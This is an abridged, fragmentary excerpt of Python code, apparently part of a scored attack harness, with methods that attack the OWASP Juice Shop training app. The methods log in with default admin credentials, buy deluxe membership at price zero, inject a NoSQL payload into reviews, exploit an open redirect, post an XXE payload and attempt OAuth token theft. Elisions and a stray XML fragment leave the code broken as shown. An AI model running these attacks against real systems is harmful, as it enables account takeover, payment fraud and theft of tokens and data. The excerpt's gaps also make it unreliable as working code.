...
class JuiceShopExtension:
    ...
    def attack_juice_admin_login(self) -> Tuple[requests.Response, float]:
        ...
        r = self.session.post(url, json={"email": "admin@juice-sh.op", "password": "admin123"}, timeout=3)
        return r, -5.0
    ...
    def attack_juice_deluxe_fraud(self) -> Tuple[requests.Response, float]:
        ...
        try:
            r = self.session.post(url, json={"paymentMode": "deluxe", "price": 0}, timeout=3)
            if r.status_code in [200, 201]:
                return r, 90.0
        except:
            pass
        
        return self.session.get(f"{self.target_url}{self.JUICE_ENDPOINTS['deluxe']}", timeout=3), -2.0
    ...
    def attack_juice_review_nosql(self) -> Tuple[requests.Response, float]:
        ...
        try:
            r = self.session.patch(url, json={"id": nosql_payload, "message": "Hacked"}, timeout=3)
            if r.status_code in [200, 201]:
                return r, 95.0
        except:
            pass
    ...
    def attack_juice_redirect_exploit(self) -> Tuple[requests.Response, float]:
        ...
        for mal_url in malicious_urls:
            try:
                r = self.session.get(url, params={"to": mal_url}, timeout=3, allow_redirects=False)
                if r.status_code in [301, 302] and mal_url in r.headers.get('Location', ''):
                    return r, 75.0
            except:
                pass
...
<complaint>
  <message>&xxe;</message>
        ...
        try:
            r = self.session.post(url, data=xxe_payload, headers={'Content-Type': 'application/xml'}, timeout=3)
    ...
    def attack_oauth_token_theft(self) -> Tuple[requests.Response, float]:
        ...
        for callback in callback_urls:
            ...
            try:
                ...
                if r.status_code == 200 and ('success' in r.text.lower() or 'logged' in r.text.lower()):
